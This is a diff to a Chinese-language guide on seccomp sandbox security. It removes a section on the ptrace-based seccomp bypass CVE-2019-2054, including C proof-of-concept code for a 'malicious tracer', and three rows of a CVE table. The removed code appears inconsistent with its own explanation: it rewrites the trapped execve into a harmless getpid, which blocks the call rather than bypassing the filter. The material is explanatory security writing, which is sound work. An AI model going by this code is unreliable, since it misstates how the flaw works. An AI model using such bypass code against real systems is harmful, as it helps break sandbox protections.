@@ -388,67 +388,6 @@ void setup_sigsys_handler() {
 - 检测是否存在非预期的 seccomp filter
 - 使用 hardware-backed attestation 而非纯软件检测
 
-### 4.2 ptrace Bypass (CVE-2019-2054)
-
-在 Linux kernel < 4.8 上，seccomp 与 ptrace 存在配合问题。
-
-**漏洞原理**：
-
-当 seccomp filter 返回 SECCOMP_RET_TRACE 时，内核会通知 ptrace tracer。但在旧内核中，tracer 修改 syscall number 或参数后，内核**不会重新检查** seccomp filter。
-
-**攻击流程**：
-
-```c
-// 被沙箱限制的子进程
-void sandboxed_child() {
-    struct sock_filter filter[] = {
-        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, 
-                 offsetof(struct seccomp_data, nr)),
-        // execve -> TRACE (通知 tracer)
-        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
-        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_TRACE),
-        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
-    };
-    
-    // ... 安装 filter ...
-    execve("/bin/sh", NULL, NULL);
-}
-
-// 恶意 tracer 进程
-void malicious_tracer(pid_t child) {
-    int status;
-    ptrace(PTRACE_ATTACH, child, NULL, NULL);
-    
-    while (1) {
-        waitpid(child, &status, 0);
-        
-        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
-            struct user_regs_struct regs;
-            ptrace(PTRACE_GETREGS, child, NULL, &regs);
-            
-            if (regs.orig_rax == __NR_execve) {
-                // 漏洞：修改 syscall 为允许的 syscall
-                // 内核不会重新检查 seccomp!
-                regs.orig_rax = __NR_getpid;
-                ptrace(PTRACE_SETREGS, child, NULL, &regs);
-            }
-        }
-        
-        ptrace(PTRACE_CONT, child, NULL, NULL);
-    }
-}
-```
-
-**受影响范围**：
-
-- Android 8.x/9.x 部分设备（Pixel 1, 2 等早期设备）
-- 任何使用 Linux kernel < 4.8 的系统
-
-**修复**：
-
-- Kernel 4.8+ 在 ptrace 修改后会重新检查 seccomp filter
-- 策略中应明确禁止 ptrace syscall
-
 ### 4.3 SIGSYS Handler 绕过
 
 如果 seccomp 使用 SECCOMP_RET_TRAP 并依赖 SIGSYS handler 做额外处理，可能存在绕过。
@@ -533,9 +472,6 @@ buffer: times 100 db 0
 
 | CVE | 描述 | 影响版本 |
 |-----|------|---------|
-| CVE-2019-2054 | ptrace 可绕过 seccomp filter，内核在 tracer 修改 syscall 后不重新检查 | Linux kernel < 4.8 |
-| CVE-2020-0261 | Android C2 (flame) 设备缺少 seccomp 配置文件导致保护缺失 | 特定 Android 设备 |
-| CVE-2022-22057 | Qualcomm GPU 驱动漏洞可导致 seccomp 沙箱逃逸 | 特定高通芯片组 |
 
 ## 6. 调试与排查
 
